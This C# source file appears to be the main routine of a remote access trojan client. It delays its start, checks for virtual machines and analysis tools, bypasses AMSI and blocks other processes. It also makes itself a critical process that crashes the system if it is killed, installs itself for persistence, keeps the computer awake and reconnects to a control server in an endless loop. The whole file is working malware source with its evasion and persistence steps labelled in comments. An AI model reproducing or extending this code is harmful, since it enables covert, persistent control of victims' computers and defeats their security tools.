using System.Threading;
using Client.Connection;
using Client.Install;
using System;
using Client.Helper;
using System.Net;
using System.Windows.Forms;

namespace Client
{
    public class Program
    {
        [STAThread]
        public static void Main()
        {
            // SSL
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.DefaultConnectionLimit = 9999;

            for (int i = 0; i < Convert.ToInt32(Settings.De_lay); i++)
            {
                Thread.Sleep(1000);
            }

            if (!Settings.InitializeSettings()) Environment.Exit(0);
            SetRegistry.InitRegistry();
            try
            {
                
                if (Convert.ToBoolean(Settings.An_ti)) //run anti-virtual environment
                    Anti_Analysis.RunAntiAnalysis();
            }
            catch { }
            A.B();//Amsi Bypass
            try
            {
                if (!MutexControl.CreateMutex()) //if current payload is a duplicate
                    Environment.Exit(0);
            }
            catch { }
            try
            {
                if (Convert.ToBoolean(Settings.Anti_Process)) //run AntiProcess
                    AntiProcess.StartBlock();
            }
            catch { }
            try
            {
                if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin()) //active critical process
                    ProcessCritical.Set();
            }
            catch { }
            try
            {
                if (Convert.ToBoolean(Settings.In_stall)) //drop payload [persistence]
                    NormalStartup.Install();
            }
            catch { }
            Methods.PreventSleep(); //prevent pc to idle\sleep
            try
            {
                if (Methods.IsAdmin())
                    Methods.ClearSetting();
            }
            catch { }

            while (true) // ~ loop to check socket status
            {
                try
                {
                    if (!ClientSocket.IsConnected)
                    {
                        ClientSocket.Reconnect();
                        ClientSocket.InitializeClient();
                    }
                }
                catch { }
                Thread.Sleep(5000);
            }
        }
    }
}